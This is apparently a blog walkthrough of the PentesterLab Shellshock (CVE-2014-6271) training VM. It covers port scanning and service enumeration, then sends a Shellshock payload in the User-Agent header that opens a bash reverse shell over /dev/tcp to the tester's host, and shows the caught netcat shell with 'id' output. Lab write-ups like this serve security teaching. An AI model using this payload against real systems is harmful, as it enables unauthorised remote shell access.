---
layout: blog_item
title:  "Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough"
date:   2014-09-30 10:00:10
author: Arr0way
description: 'Shellshock CVE-2014-6271 Pen Testers Lab - Walkthrough'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

This course details the exploitation of the vulnerability **CVE-2014-6271** AKA **Shellshock**. This vulnerability impacts the Bourne Again Shell "Bash". Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface "CGI".

**Author:** PentesterLab

**Download:** [VulnHub](https://www.vulnhub.com)

<div class="note info">
  <h5>This is not a challenge VM</h5>
  <p>This VM is part of the exercises provided by <a href="https://pentesterlab.com">PenTestersLab.com</a>, it's not a challenge VM (there is no flag to capture). </p>
</div>

## Host Enumeration

### Port Scanning

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.221.144

{% endhighlight %}

### Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 6.0 (protocol 2.0)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.21 ((Unix) DAV/2)</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>

## Website Inspection

Inspection of Squid using the metasploit module <code>auxiliary/scanner/http/squid_pivot_scanning</code> discovered port 80 was exposed via the proxy.

![Shellshock Burp Suite](/img/blog/pentesterslab/shellshock/shellshock-burp.png)


## Burp Suite - Send Reverse Shellshock

Burp Suite was used to manipulate the <code>User Agent:</code> and deliver the following payload:  

{% highlight bash %}

() { ignored;};/bin/bash -i >& /dev/tcp/192.168.221.139/443 0>&1

{% endhighlight %}

![Burp Suite Shellshock Payload](/img/blog/pentesterslab/shellshock/shellshock-payload-burp.png)

## Reverse Shell

Successfully connecting to the listening netcat instance:

{% highlight bash %}
[root:~]# nc.traditional -lp 443 -vvv
listening on [any] 443 ...
192.168.221.144: inverse host lookup failed: Unknown host
connect to [192.168.221.139] from (UNKNOWN) [192.168.221.144] 44254
bash: no job control in this shell
bash-4.2$ id
id
uid=1000(pentesterlab) gid=50(staff) groups=50(staff),100(pentesterlab)

{% endhighlight %}

End of exercise.

Thanks for the VM :)
